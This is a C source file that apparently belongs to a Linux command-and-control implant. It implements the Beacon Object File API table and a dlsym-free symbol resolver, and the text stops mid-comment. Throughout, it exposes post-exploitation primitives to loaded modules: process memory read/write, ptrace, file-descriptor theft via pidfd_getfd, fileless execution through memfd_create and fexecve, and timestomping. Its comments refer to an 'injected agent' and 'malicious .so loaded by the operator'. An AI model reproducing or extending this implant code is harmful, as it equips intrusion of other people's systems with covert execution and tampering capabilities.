/* bof_api.c — Linux Beacon API implementation for BOF execution
 * Provides the function table that the ELF BOF loader resolves against.
 */

#include "bof_api.h"
#include "elf_bof.h"

#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <limits.h>
#include <signal.h>
#include <setjmp.h>

/* Syscall numbers for compatibility with older systems (Linux x86_64) */

#ifndef SYS_process_vm_readv
#define SYS_process_vm_readv   310
#endif

#ifndef SYS_process_vm_writev
#define SYS_process_vm_writev  311
#endif

#ifndef SYS_pidfd_open
#define SYS_pidfd_open         434
#endif

#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd        438
#endif

#ifndef SYS_io_uring_setup
#define SYS_io_uring_setup     425
#endif

#ifndef SYS_io_uring_enter
#define SYS_io_uring_enter     426
#endif

#ifndef SYS_io_uring_register
#define SYS_io_uring_register  427
#endif

/* ── Output buffer ── */

typedef struct { char *data; uint32_t len; uint32_t cap; } bof_buf_t;
static __thread bof_buf_t g_bof_output;
static __thread int g_bof_initialized = 0, g_bof_error = 0;

static void buf_ensure(bof_buf_t *b, uint32_t extra) {
    if (b->len + extra > b->cap) {
        uint32_t nc = (b->cap == 0) ? 4096 : b->cap;
        while (nc < b->len + extra) nc *= 2;
        if (nc > BOF_OUTPUT_MAX) nc = BOF_OUTPUT_MAX;
        char *p = (char *)realloc(b->data, nc);
        if (!p) return;
        b->data = p;
        b->cap = nc;
    }
}
static void buf_append(bof_buf_t *b, const void *d, uint32_t n) {
    buf_ensure(b, n);
    if (b->len + n <= b->cap) { memcpy(b->data + b->len, d, n); b->len += n; }
}

void bof_output_init(void) {
    if (!g_bof_initialized) { memset(&g_bof_output, 0, sizeof(g_bof_output)); g_bof_initialized = 1; }
    else g_bof_output.len = 0;
    g_bof_error = 0;
}
void bof_output_cleanup(void) {
    if (g_bof_initialized) { free(g_bof_output.data); memset(&g_bof_output, 0, sizeof(g_bof_output)); g_bof_initialized = 0; }
}
const char *bof_output_get(uint32_t *out_len) {
    if (!g_bof_initialized || g_bof_output.len == 0) { if (out_len) *out_len = 0; return ""; }
    buf_ensure(&g_bof_output, 1);
    if (g_bof_output.data) g_bof_output.data[g_bof_output.len] = '\0';
    if (out_len) *out_len = g_bof_output.len;
    return g_bof_output.data ? g_bof_output.data : "";
}
int bof_output_get_error(void) { return g_bof_error; }

static unsigned int swap32(unsigned int v) {
    return ((v>>24)&0xFF)|((v>>8)&0xFF00)|((v<<8)&0xFF0000)|((v<<24)&0xFF000000);
}

/* ── Beacon Data Parser ── */

void BeaconDataParse(datap *p, char *buf, int sz) {
    if (!p) return;
    if (!buf || sz < 4) {
        p->original = p->buffer = buf;
        p->length = p->size = 0;
        return;
    }
    p->original = buf;
    p->buffer   = buf + 4;
    p->length   = sz - 4;
    p->size     = sz - 4;
}
int BeaconDataInt(datap *p) {
    if(!p||p->length<4)return 0;
    int v=0; memcpy(&v,p->buffer,4);
    p->buffer+=4;
    p->length-=4;
    return v;
}
short BeaconDataShort(datap *p) {
    if(!p||p->length<2)return 0;
    short v=0;
    memcpy(&v,p->buffer,2);
    p->buffer+=2;
    p->length-=2;
    return v;
}
int BeaconDataLength(datap *p) { return p?p->length:0; }
char *BeaconDataExtract(datap *p, int *sz) {
    if (!p || p->length < 4) return NULL;
    unsigned int l = 0;
    memcpy(&l, p->buffer, 4);
    p->length -= 4;
    p->buffer += 4;
    if (l > (unsigned int)p->length) return NULL;
    char *o = p->buffer;
    p->buffer += (int)l;
    p->length -= (int)l;
    if (sz) *sz = (int)l;
    return o;
}

/* ── Beacon Output ── */

void BeaconOutput(int type, const char *data, int len) {
    if(!data||!g_bof_initialized)return;
    if(type==CALLBACK_ERROR)g_bof_error=CALLBACK_ERROR;
    buf_append(&g_bof_output, data, len>0?(uint32_t)len:(uint32_t)strlen(data));
}
void BeaconPrintf(int type, const char *fmt, ...) {
    if(!fmt||!g_bof_initialized)return;
    if(type==CALLBACK_ERROR)g_bof_error=CALLBACK_ERROR;
    va_list a; va_start(a,fmt); int n=vsnprintf(NULL,0,fmt,a); va_end(a);
    if(n<=0)return;
    char *t=(char*)malloc(n+1); if(!t)return;
    va_start(a,fmt); vsnprintf(t,n+1,fmt,a); va_end(a);
    buf_append(&g_bof_output,t,(uint32_t)n); free(t);
}

/* ── Beacon Format ── */

void BeaconFormatAlloc(formatp *f, int m) { if(!f)return; f->original=(char*)calloc(1,m); f->buffer=f->original; f->length=0; f->size=m; }
void BeaconFormatReset(formatp *f) { if(!f||!f->original)return; memset(f->original,0,f->size); f->buffer=f->original; f->length=0; }
void BeaconFormatAppend(formatp *f, const char *t, int l) { if(!f||!t||f->length+l>f->size)return; memcpy(f->buffer,t,l); f->buffer+=l; f->length+=l; }
void BeaconFormatPrintf(formatp *f, const char *fmt, ...) {
    if(!f||!fmt)return;
    int r=f->size-f->length;
    if(r<=0)return;
    va_list a; va_start(a,fmt); int w=vsnprintf(f->buffer,r,fmt,a); va_end(a);
    if(w>0){f->length+=w;f->buffer+=w;}
}
char *BeaconFormatToString(formatp *f, int *s) { if(!f)return NULL; if(s)*s=f->length; return f->original; }
void BeaconFormatFree(formatp *f) { if(!f)return; if(f->original){memset(f->original,0,f->size);free(f->original);} f->original=NULL;f->buffer=NULL;f->length=0;f->size=0; }
void BeaconFormatInt(formatp *f, int v) { if(!f||f->length+4>f->size)return; unsigned int o=swap32((unsigned int)v); memcpy(f->buffer,&o,4); f->length+=4; f->buffer+=4; }

int BeaconIsAdmin(void) { return (geteuid()==0)?1:0; }

/* ── File system ── */

int AxFstatvfs(int fd, struct statvfs *buf) { return fstatvfs(fd, buf); }
int AxStatvfs(const char *path, struct statvfs *buf) { return statvfs(path, buf); }
char *AxRealpath(const char *path, char *resolved_path) {
    if (!path) return NULL;
    return realpath(path, resolved_path);
}
int AxOpenFile(const char *p, int f, int m) { return p?open(p,f,m):-1; }
int AxCloseFile(int fd) { return fd>=0?close(fd):-1; }
ssize_t AxReadFile(int fd, void *b, size_t c) { return (fd>=0&&b&&c>0)?read(fd,b,c):(ssize_t)-1; }
int AxReadFileToBuffer(const char *path, char **out, int max) {
    if(!path||!out)return-1;
    if(max<=0)max=1048576;
    int fd=open(path,O_RDONLY); if(fd<0)return-1;
    char *b=(char*)malloc(max+1); if(!b){close(fd);return-1;}
    int t=0; while(t<max){ssize_t n=read(fd,b+t,max-t);if(n<=0)break;t+=(int)n;}
    close(fd); b[t]='\0'; *out=b; return t;
}
int AxFileStat(const char *p, unsigned int *m, long *s, unsigned int *u, unsigned int *g) {
    if(!p)return-1;
    struct stat st;
    if(stat(p,&st)!=0)return-1;
    if(m)*m=(unsigned int)st.st_mode;
    if(s)*s=(long)st.st_size;
    if(u)*u=(unsigned int)st.st_uid;
    if(g)*g=(unsigned int)st.st_gid;
    return 0;
}
int AxOpenDir(const char *p) { return p?open(p,O_RDONLY|O_DIRECTORY):-1; }
int AxReadDir(int fd, void *b, int s) { return(fd<0||!b||s<=0)?-1:(int)syscall(SYS_getdents64,fd,b,(unsigned int)s); }

/* ── Memory + Strings ── */

void *AxMalloc(size_t s) { return s>0?malloc(s):NULL; }
void  AxFree(void *p) { if(p)free(p); }
void *AxMemset(void *s, int c, size_t n) { return(s&&n>0)?memset(s,c,n):s; }
void *AxMemcpy(void *d, const void *s, size_t n) { return(d&&s&&n>0)?memcpy(d,s,n):d; }
void *AxMemmove(void *d, const void *s, size_t n) { return(d&&s&&n>0)?memmove(d,s,n):d; }
int   AxMemcmp(const void *a, const void *b, size_t n) { return(a&&b&&n>0)?memcmp(a,b,n):0; }
size_t AxStrlen(const char *s) { return s?strlen(s):0; }
int   AxStrcmp(const char *a, const char *b) { return(a&&b)?strcmp(a,b):-1; }
int   AxStrncmp(const char *a, const char *b, size_t n) { return(a&&b&&n>0)?strncmp(a,b,n):-1; }
char *AxStrcpy(char *d, const char *s) { return(d&&s)?strcpy(d,s):d; }
char *AxStrncpy(char *d, const char *s, size_t n) { return(d&&s&&n>0)?strncpy(d,s,n):d; }
char *AxStrcat(char *d, const char *s) { return(d&&s)?strcat(d,s):d; }
char *AxStrstr(const char *h, const char *n) { return(h&&n)?(char*)strstr(h,n):NULL; }
char *AxStrchr(const char *s, int c) { return s?(char*)strchr(s,c):NULL; }
int AxSnprintf(char *b, size_t s, const char *f, ...) {
    if(!b||!f||s==0)return 0;
    va_list a; va_start(a,f);
    int r=vsnprintf(b,s,f,a);
    va_end(a);
    return r;
}

/* ── Process info ── */

int AxGetPid(void) { return(int)getpid(); }
int AxGetUid(void) { return(int)getuid(); }
int AxGetEuid(void) { return(int)geteuid(); }
int AxGetCwd(char *b, int s) { return(!b||s<=0)?-1:(getcwd(b,s)?(int)strlen(b):-1); }
int AxGetEnv(const char *name, char *out, int out_size) {
    if(!name||!out||out_size<=0)return-1;
    char *d=NULL; int dl=AxReadFileToBuffer("/proc/self/environ",&d,65536);
    if(dl<=0||!d)return-1;
    int nl=(int)strlen(name);
    int found=-1;
    int p=0;
    while(p<dl){char *e=d+p;int el=0;while(p+el<dl&&e[el]!='\0')el++;
        if(el>nl+1&&strncmp(e,name,nl)==0&&e[nl]=='='){
            char *v=e+nl+1;int vl=el-nl-1;if(vl>=out_size)vl=out_size-1;
            memcpy(out,v,vl);out[vl]='\0';found=vl;break;}
        p+=el+1;}
    free(d); return found;
}

int AxFileTime(const char *path, long *atime, long *mtime) {
    if (!path) return -1;
    struct stat st;
    if (stat(path, &st) != 0) return -1;
    if (atime) *atime = (long)st.st_atime;
    if (mtime) *mtime = (long)st.st_mtime;
    return 0;
}
int AxSetFileTime(const char *path, long atime, long mtime) {
    if (!path) return -1;
    struct timespec ts[2];
    ts[0].tv_sec = atime; ts[0].tv_nsec = 0;
    ts[1].tv_sec = mtime; ts[1].tv_nsec = 0;
    return utimensat(AT_FDCWD, path, ts, 0);
}

/* ── Networking ── */

int AxSocket(int d, int t, int p) { return socket(d,t,p); }
int AxConnect(int fd, const void *a, int l) { return connect(fd,(const struct sockaddr*)a,(socklen_t)l); }
int AxBind(int fd, const void *a, int l) { return bind(fd,(const struct sockaddr*)a,(socklen_t)l); }
int AxListen(int fd, int b) { return listen(fd,b); }
int AxAccept(int fd, void *a, int *l) {
    socklen_t sl=l?(socklen_t)*l:0; int r=accept(fd,(struct sockaddr*)a,l?&sl:NULL); if(l)*l=(int)sl; return r;
}
ssize_t AxSend(int fd, const void *b, size_t l, int f) { return send(fd,b,l,f); }
ssize_t AxRecv(int fd, void *b, size_t l, int f) { return recv(fd,b,l,f); }
ssize_t AxSendto(int fd, const void *b, size_t l, int f, const void *da, socklen_t al) {
    return sendto(fd,b,l,f,(const struct sockaddr*)da,al);
}
ssize_t AxRecvfrom(int fd, void *b, size_t l, int f, void *sa, socklen_t *al) {
    return recvfrom(fd,b,l,f,(struct sockaddr*)sa,al);
}
int AxClose(int fd) { return close(fd); }
int AxSetsockopt(int fd, int lv, int on, const void *ov, int ol) {
    return setsockopt(fd,lv,on,ov,(socklen_t)ol);
}
int AxGetsockopt(int fd, int lv, int on, void *ov, int *ol) {
    socklen_t sl=ol?(socklen_t)*ol:0;
    int r=getsockopt(fd,lv,on,ov,ol?&sl:NULL); if(ol)*ol=(int)sl; return r;
}

/* ── Address conversion ── */

int AxInetPton(int af, const char *s, void *d) { return inet_pton(af,s,d); }
const char *AxInetNtop(int af, const void *s, char *d, int sz) { return inet_ntop(af,s,d,(socklen_t)sz); }
char *AxInetNtoa(unsigned int a) { struct in_addr i; i.s_addr=a; return inet_ntoa(i); }
unsigned short AxHtons(unsigned short v) { return htons(v); }
unsigned short AxNtohs(unsigned short v) { return ntohs(v); }

/* ── System ── */

int AxGetErrno(void) { return errno; }
int AxFcntl(int fd, int cmd, int arg) { return fcntl(fd,cmd,arg); }
int AxPoll(void *fds, int n, int ms) { return poll((struct pollfd*)fds,(nfds_t)n,ms); }

/* ── Async support ── */

extern int nax_async_get_stop_fd(void);
int BeaconGetStopJobEvent(void) { return nax_async_get_stop_fd(); }

/* ── Inter-BOF shared globals ── */

#define MAX_GLOBALS 16
static struct { const char *key; void *ptr; } g_bof_globals[MAX_GLOBALS];
static int g_bof_nglobals = 0;
static pthread_mutex_t g_bof_globals_mu = PTHREAD_MUTEX_INITIALIZER;

void *AxGetGlobal(const char *key) {
    if (!key) return NULL;
    pthread_mutex_lock(&g_bof_globals_mu);
    void *result = NULL;
    for (int i = 0; i < g_bof_nglobals; i++) {
        if (strcmp(g_bof_globals[i].key, key) == 0) {
            result = g_bof_globals[i].ptr;
            break;
        }
    }
    pthread_mutex_unlock(&g_bof_globals_mu);
    return result;
}

void AxSetGlobal(const char *key, void *ptr) {
    if (!key) return;
    pthread_mutex_lock(&g_bof_globals_mu);
    for (int i = 0; i < g_bof_nglobals; i++) {
        if (strcmp(g_bof_globals[i].key, key) == 0) {
            g_bof_globals[i].ptr = ptr;
            pthread_mutex_unlock(&g_bof_globals_mu);
            return;
        }
    }
    if (g_bof_nglobals < MAX_GLOBALS) {
        g_bof_globals[g_bof_nglobals].key = key;
        g_bof_globals[g_bof_nglobals].ptr = ptr;
        g_bof_nglobals++;
    }
    pthread_mutex_unlock(&g_bof_globals_mu);
}

/* ── Symbol resolution table ── */

typedef struct { const char *name; void *func; } bof_api_entry_t;

/* ── Process control ── */

int AxExecveat(int dirfd, const char *pathname, char *const argv[],
               char *const envp[], int flags) {
#ifdef __NR_execveat
    return syscall(__NR_execveat, dirfd, pathname, argv, envp, flags);
#else
    errno = ENOSYS;
    return -1;
#endif
}

int AxSocketpair(int domain, int type, int protocol, int sv[2]) {
    return socketpair(domain, type, protocol, sv);
}

void AxExit(int status) {
    _exit(status);
}

int AxPipe(int fd[2]) {
    return pipe(fd);
}

int AxMemfdCreate(const char *name, unsigned int flags) {
#ifdef SYS_memfd_create
    return syscall(SYS_memfd_create, name, flags);
#else
    errno = ENOSYS;
    return -1;
#endif
}

int AxFexecve(int fd, char *const argv[], char *const envp[]) {
    return fexecve(fd, argv, envp);
}

int AxFork(void) { return fork(); }

int AxExecve(const char *path, char *const argv[], char *const envp[]) {
    return execve(path, argv, envp);
}

int AxWaitpid(int pid, int *status, int options) {
    return waitpid(pid, status, options);
}

int AxKill(int pid, int sig) { return kill(pid, sig); }

long AxPtrace(int request, int pid, void *addr, void *data) {
    return ptrace(request, pid, addr, data);
}

ssize_t AxProcessVmReadv(int pid, const struct iovec *local_iov,
                         unsigned long liovcnt,
                         const struct iovec *remote_iov,
                         unsigned long riovcnt, unsigned long flags) {
#ifdef SYS_process_vm_readv
    return syscall(SYS_process_vm_readv, pid, local_iov, liovcnt, remote_iov, riovcnt, flags);
#else
    errno = ENOSYS;
    return -1;
#endif
}

ssize_t AxProcessVmWritev(int pid, const struct iovec *local_iov,
                          unsigned long liovcnt,
                          const struct iovec *remote_iov,
                          unsigned long riovcnt, unsigned long flags) {
#ifdef SYS_process_vm_writev
    return syscall(SYS_process_vm_writev, pid, local_iov, liovcnt, remote_iov, riovcnt, flags);
#else
    errno = ENOSYS;
    return -1;
#endif
}

int AxPidfdOpen(int pid, unsigned int flags) {
#ifdef SYS_pidfd_open
    return syscall(SYS_pidfd_open, pid, flags);
#else
    errno = ENOSYS;
    return -1;
#endif
}

int AxPidfdGetfd(int pidfd, int targetfd, unsigned int flags) {
#ifdef SYS_pidfd_getfd
    return syscall(SYS_pidfd_getfd, pidfd, targetfd, flags);
#else
    errno = ENOSYS;
    return -1;
#endif
}

/* ── Advanced filesystem ── */

int AxChdir(const char *path) { return chdir(path); }
int AxFchdir(int fd) { return fchdir(fd); }
int AxChmod(const char *path, mode_t mode) { return chmod(path, mode); }
int AxFchmod(int fd, mode_t mode) { return fchmod(fd, mode); }
int AxChown(const char *path, uid_t owner, gid_t group) { return chown(path, owner, group); }
int AxFchown(int fd, uid_t owner, gid_t group) { return fchown(fd, owner, group); }
int AxSymlink(const char *target, const char *linkpath) { return symlink(target, linkpath); }
ssize_t AxReadlink(const char *path, char *buf, size_t bufsiz) { return readlink(path, buf, bufsiz); }
int AxDup(int oldfd) { return dup(oldfd); }
int AxDup2(int oldfd, int newfd) { return dup2(oldfd, newfd); }
int AxIoctl(int fd, unsigned long request, ...) {
    va_list args;
    va_start(args, request);
    void *arg = va_arg(args, void *);
    va_end(args);
    return ioctl(fd, request, arg);
}

/* ── System info ── */

int AxSysinfo(struct sysinfo *info) { return sysinfo(info); }
int AxUname(struct utsname *buf) { return uname(buf); }

/* ── io_uring ── */

int AxIoUringSetup(unsigned int entries, struct io_uring_params *p) {
#ifdef SYS_io_uring_setup
    return syscall(SYS_io_uring_setup, entries, p);
#else
    errno = ENOSYS;
    return -1;
#endif
}

int AxIoUringEnter(int fd, unsigned int to_submit,
                   unsigned int min_complete, unsigned int flags) {
#ifdef SYS_io_uring_enter
    return syscall(SYS_io_uring_enter, fd, to_submit, min_complete, flags, NULL, 0);
#else
    errno = ENOSYS;
    return -1;
#endif
}

int AxIoUringRegister(int fd, unsigned int opcode, void *arg,
                      unsigned int nr_args) {
#ifdef SYS_io_uring_register
    return syscall(SYS_io_uring_register, fd, opcode, arg, nr_args);
#else
    errno = ENOSYS;
    return -1;
#endif
}

ssize_t AxWriteFile(int fd, const void *buf, size_t count) {
    return write(fd, buf, count);
}

/* ── Time ── */
struct tm *AxLocaltime(const time_t *timer) {
    return localtime(timer);
}


static bof_api_entry_t bof_api_table[] = {
    {"BeaconDataParse",      (void*)BeaconDataParse},
    {"BeaconDataInt",        (void*)BeaconDataInt},
    {"BeaconDataShort",      (void*)BeaconDataShort},
    {"BeaconDataLength",     (void*)BeaconDataLength},
    {"BeaconDataExtract",    (void*)BeaconDataExtract},
    {"BeaconOutput",         (void*)BeaconOutput},
    {"BeaconPrintf",         (void*)BeaconPrintf},
    {"BeaconFormatAlloc",    (void*)BeaconFormatAlloc},
    {"BeaconFormatReset",    (void*)BeaconFormatReset},
    {"BeaconFormatAppend",   (void*)BeaconFormatAppend},
    {"BeaconFormatPrintf",   (void*)BeaconFormatPrintf},
    {"BeaconFormatToString", (void*)BeaconFormatToString},
    {"BeaconFormatFree",     (void*)BeaconFormatFree},
    {"BeaconFormatInt",      (void*)BeaconFormatInt},
    {"BeaconIsAdmin",        (void*)BeaconIsAdmin},
    {"BeaconGetStopJobEvent", (void*)BeaconGetStopJobEvent},
    {"AxOpenFile",           (void*)AxOpenFile},
    {"AxStatvfs",            (void*)AxStatvfs},
    {"AxFstatvfs",           (void*)AxFstatvfs},
    {"AxRealpath",           (void*)AxRealpath},
    {"AxCloseFile",          (void*)AxCloseFile},
    {"AxReadFile",           (void*)AxReadFile},
    {"AxReadFileToBuffer",   (void*)AxReadFileToBuffer},
    {"AxFileStat",           (void*)AxFileStat},
    {"AxOpenDir",            (void*)AxOpenDir},
    {"AxReadDir",            (void*)AxReadDir},
    {"AxMalloc",             (void*)AxMalloc},
    {"AxFree",               (void*)AxFree},
    {"AxMemset",             (void*)AxMemset},
    {"AxMemcpy",             (void*)AxMemcpy},
    {"AxMemmove",            (void*)AxMemmove},
    {"AxMemcmp",             (void*)AxMemcmp},
    {"AxStrlen",             (void*)AxStrlen},
    {"AxStrcmp",             (void*)AxStrcmp},
    {"AxStrncmp",            (void*)AxStrncmp},
    {"AxStrcpy",             (void*)AxStrcpy},
    {"AxStrncpy",            (void*)AxStrncpy},
    {"AxStrcat",             (void*)AxStrcat},
    {"AxStrstr",             (void*)AxStrstr},
    {"AxStrchr",             (void*)AxStrchr},
    {"AxSnprintf",           (void*)AxSnprintf},
    {"AxGetPid",             (void*)AxGetPid},
    {"AxGetUid",             (void*)AxGetUid},
    {"AxGetEuid",            (void*)AxGetEuid},
    {"AxGetCwd",             (void*)AxGetCwd},
    {"AxGetEnv",             (void*)AxGetEnv},
    {"AxFileTime",           (void*)AxFileTime},
    {"AxSetFileTime",        (void*)AxSetFileTime},
    {"AxSocket",             (void*)AxSocket},
    {"AxConnect",            (void*)AxConnect},
    {"AxBind",               (void*)AxBind},
    {"AxListen",             (void*)AxListen},
    {"AxAccept",             (void*)AxAccept},
    {"AxSend",               (void*)AxSend},
    {"AxRecv",               (void*)AxRecv},
    {"AxSendto",             (void*)AxSendto},
    {"AxRecvfrom",           (void*)AxRecvfrom},
    {"AxClose",              (void*)AxClose},
    {"AxSetsockopt",         (void*)AxSetsockopt},
    {"AxGetsockopt",         (void*)AxGetsockopt},
    {"AxInetPton",           (void*)AxInetPton},
    {"AxInetNtop",           (void*)AxInetNtop},
    {"AxInetNtoa",           (void*)AxInetNtoa},
    {"AxHtons",              (void*)AxHtons},
    {"AxNtohs",              (void*)AxNtohs},
    {"AxGetErrno",           (void*)AxGetErrno},
    {"AxFcntl",              (void*)AxFcntl},
    {"AxPoll",               (void*)AxPoll},
    {"AxExit",               (void*)AxExit},
    {"AxFork",               (void*)AxFork},
    /* AxClone eliminado — ver nota en bof_api.h */
    {"AxExecveat",           (void*)AxExecveat},
    {"AxSocketpair",         (void*)AxSocketpair},
    {"AxPipe",               (void*)AxPipe},
    {"AxMemfdCreate",        (void*)AxMemfdCreate},
    {"AxFexecve",            (void*)AxFexecve},
    {"AxExecve",             (void*)AxExecve},
    {"AxWaitpid",            (void*)AxWaitpid},
    {"AxKill",               (void*)AxKill},
    {"AxPtrace",             (void*)AxPtrace},
    {"AxProcessVmReadv",     (void*)AxProcessVmReadv},
    {"AxProcessVmWritev",    (void*)AxProcessVmWritev},
    {"AxPidfdOpen",          (void*)AxPidfdOpen},
    {"AxPidfdGetfd",         (void*)AxPidfdGetfd},
    /* Advanced filesystem */
    {"AxChdir",              (void*)AxChdir},
    {"AxFchdir",             (void*)AxFchdir},
    {"AxChmod",              (void*)AxChmod},
    {"AxFchmod",             (void*)AxFchmod},
    {"AxChown",              (void*)AxChown},
    {"AxFchown",             (void*)AxFchown},
    {"AxSymlink",            (void*)AxSymlink},
    {"AxReadlink",           (void*)AxReadlink},
    {"AxDup",                (void*)AxDup},
    {"AxDup2",               (void*)AxDup2},
    {"AxIoctl",              (void*)AxIoctl},
    /* System info */
    {"AxSysinfo",            (void*)AxSysinfo},
    {"AxUname",              (void*)AxUname},
    /* io_uring */
    {"AxIoUringSetup",       (void*)AxIoUringSetup},
    {"AxIoUringEnter",       (void*)AxIoUringEnter},
    {"AxIoUringRegister",    (void*)AxIoUringRegister},
    {"AxGetGlobal",          (void*)AxGetGlobal},
    {"AxSetGlobal",          (void*)AxSetGlobal},
    {"AxWriteFile",          (void*)AxWriteFile},
    /* MAPPING OF LIBC FUNCTIONS FOR ARM64 — firmas POSIX (size_t) */
    {"memset",               (void*)AxMemset},
    {"memcpy",               (void*)AxMemcpy},
    {"memcmp",               (void*)AxMemcmp},
    {"memmove",              (void*)AxMemmove},
    {"strlen",               (void*)AxStrlen},
    {"strcmp",               (void*)AxStrcmp},
    {"strncmp",              (void*)AxStrncmp},
    {"strcpy",               (void*)AxStrcpy},
    {"strncpy",              (void*)AxStrncpy},
    {"strcat",               (void*)AxStrcat},
    {"strstr",               (void*)AxStrstr},
    {"strchr",               (void*)AxStrchr},
    {"snprintf",             (void*)AxSnprintf},
    {"vsnprintf",            (void*)vsnprintf},
    {"AxLocaltime",          (void*)AxLocaltime},
    {NULL, NULL}
};


/* ═══════════════════════════════════════════════════════════════════════
 * Runtime symbol resolver.
 *
 * Resolves LIBXXX$/RTLD$/LIBC$ prefixed symbols against the DSOs loaded
 * in the current process, without dlsym.
 *
 * Pipeline for one lookup:
 *   1. _scan_libraries()          -- populate the cache once (pthread_once)
 *   2. snapshot_bases_locked()    -- copy bases out under _lib_mutex
 *   3. _safe_resolve_from_lib()   -- resolve against each base, outside
 *                                    the mutex, under the signal guard
 *
 * The signal guard and the mutex must never overlap. A SIGSEGV caught
 * while the mutex is held would siglongjmp out without releasing it,
 * leaving the cache permanently locked. The snapshot pattern avoids
 * that: all cache access happens under the mutex; all DSO parsing
 * happens after the mutex is released.
 * ═══════════════════════════════════════════════════════════════════════ */

/* DJB2 hash — same algorithm used by .gnu_hash */
static unsigned int _djb2(const char *s) {
    unsigned int h = 5381;
    while (*s) h = h * 33 + (unsigned char)*s++;
    return h;
}

/* SysV hash (DT_HASH) — distinct from GNU hash */
static unsigned int _sysv_hash(const char *s) {
    unsigned int h = 0, g;
    while (*s) {
        h = (h << 4) + (unsigned char)*s++;
        if ((g = h & 0xf0000000u)) h ^= g >> 24;
        h &= ~g;
    }
    return h;
}

/* ELF64 types (local, avoid header conflicts) */

typedef struct { unsigned char e_ident[16]; uint16_t e_type, e_machine;
    uint32_t e_version; uint64_t e_entry, e_phoff, e_shoff;
    uint32_t e_flags; uint16_t e_ehsize, e_phentsize, e_phnum;
    uint16_t e_shentsize, e_shnum, e_shstrndx; } _Ehdr64;

typedef struct { uint32_t p_type, p_flags; uint64_t p_offset, p_vaddr,
    p_paddr, p_filesz, p_memsz, p_align; } _Phdr64;

typedef struct { uint64_t d_tag; union { uint64_t d_val; uint64_t d_ptr; } d_un; } _Dyn64;

typedef struct { uint32_t st_name; unsigned char st_info, st_other;
    uint16_t st_shndx; uint64_t st_value, st_size; } _Sym64;

_Static_assert(sizeof(_Sym64) == 24, "ELF64 Sym layout mismatch");
_Static_assert(sizeof(_Phdr64) == 56, "ELF64 Phdr layout mismatch");
_Static_assert(sizeof(_Dyn64) == 16, "ELF64 Dyn layout mismatch");

/* ELF constants */

#ifndef PT_LOAD
#define PT_LOAD     1
#endif
#ifndef PT_DYNAMIC
#define PT_DYNAMIC  2
#endif
#ifndef DT_NULL
#define DT_NULL     0
#endif
#ifndef DT_HASH
#define DT_HASH     4
#endif
#ifndef DT_STRTAB
#define DT_STRTAB   5
#endif
#ifndef DT_SYMTAB
#define DT_SYMTAB   6
#endif
#ifndef DT_GNU_HASH
#define DT_GNU_HASH 0x6ffffef5
#endif
#ifndef ET_DYN
#define ET_DYN      3
#endif
#ifndef ELFCLASS64
#define ELFCLASS64  2
#endif
#ifndef ELFDATA2LSB
#define ELFDATA2LSB 1
#endif
#ifndef EM_X86_64
#define EM_X86_64   0x3E
#endif
#ifndef EM_AARCH64
#define EM_AARCH64  0xB7
#endif
#ifndef SHN_UNDEF
#define SHN_UNDEF   0
#endif
#ifndef SHN_ABS
#define SHN_ABS     0xFFF1
#endif

/* ── Library cache ───────────────────────────────────────────────────────
 *
 * All mutations of _lib_cache happen under _lib_mutex.
 * All reads used for DSO parsing take a snapshot of the base addresses
 * under _lib_mutex, then parse outside the mutex.
 *
 * Invariants:
 *   - Entries are deduplicated by base address.
 *   - The entry named "libc" (if present) is always at index 0. */

typedef struct {
    unsigned long base;
    char          name[48];
} _lib_entry;

static _lib_entry     *_lib_cache       = NULL;
static int             _lib_cache_count = 0;
static int             _lib_cache_cap   = 0;
static pthread_once_t  _lib_once        = PTHREAD_ONCE_INIT;
static pthread_mutex_t _lib_mutex       = PTHREAD_MUTEX_INITIALIZER;

/* ── ELF validators ── */

static int _is_valid_elf64_dso(unsigned char *p) {
    if (p[0] != 0x7f || p[1] != 'E' || p[2] != 'L' || p[3] != 'F')
        return 0;
    if (p[4] != ELFCLASS64)   return 0;
    if (p[5] != ELFDATA2LSB)  return 0;

    uint16_t e_type;
    memcpy(&e_type, p + 16, 2);
    if (e_type != ET_DYN)     return 0;

    uint16_t e_machine;
    memcpy(&e_machine, p + 18, 2);
#if defined(__x86_64__)
    if (e_machine != EM_X86_64)  return 0;
#elif defined(__aarch64__)
    if (e_machine != EM_AARCH64) return 0;
#else
    if (e_machine != EM_X86_64 && e_machine != EM_AARCH64) return 0;
#endif
    return 1;
}

static int _addr_in_load_segments(uint64_t addr, uint64_t load_bias,
                                  _Ehdr64 *eh, _Phdr64 *phdrs) {
    for (int i = 0; i < eh->e_phnum; i++) {
        if (phdrs[i].p_type != PT_LOAD) continue;
        uint64_t seg_start = load_bias + phdrs[i].p_vaddr;
        uint64_t seg_end   = seg_start + phdrs[i].p_memsz;
        if (addr >= seg_start && addr < seg_end) return 1;
    }
    return 0;
}

static uint64_t _bytes_to_segment_end(uint64_t addr, uint64_t load_bias,
                                      _Ehdr64 *eh, _Phdr64 *phdrs) {
    for (int i = 0; i < eh->e_phnum; i++) {
        if (phdrs[i].p_type != PT_LOAD) continue;
        uint64_t seg_start = load_bias + phdrs[i].p_vaddr;
        uint64_t seg_end   = seg_start + phdrs[i].p_memsz;
        if (addr >= seg_start && addr < seg_end)
            return seg_end - addr;
    }
    return 0;
}

static uint64_t _resolve_dptr(uint64_t raw, uint64_t load_bias,
                              _Ehdr64 *eh, _Phdr64 *phdrs) {
    if (!raw) return 0;
    if (_addr_in_load_segments(raw, load_bias, eh, phdrs))
        return raw;
    if (_addr_in_load_segments(load_bias + raw, load_bias, eh, phdrs))
        return load_bias + raw;
    return 0;
}

/* Comparamos 2 cadenas byte a byte sin SIMD, sin leer fuera de rango */
static int _safe_str_eq(const char *a, const char *b,
                        uint64_t a_len, uint64_t b_len) {
    uint64_t n = a_len < b_len ? a_len : b_len;
    for (uint64_t i = 0; i < n; i++) {
        if (a[i] != b[i]) return 0;
        if (a[i] == '\0') return 1;
    }
    return 0;
}

/* Solo DSOs en rutas estándar del sistema.
 *
 * Excluye explícitamente:
 *   - El propio agente inyectado (/tmp/..., /dev/shm/..., /home/...)
 *   - .so maliciosas cargadas por el operador
 *   - memfd:*, .xpi, .otf, .bin, .ja, .log, .sqlite-shm, etc.
 *
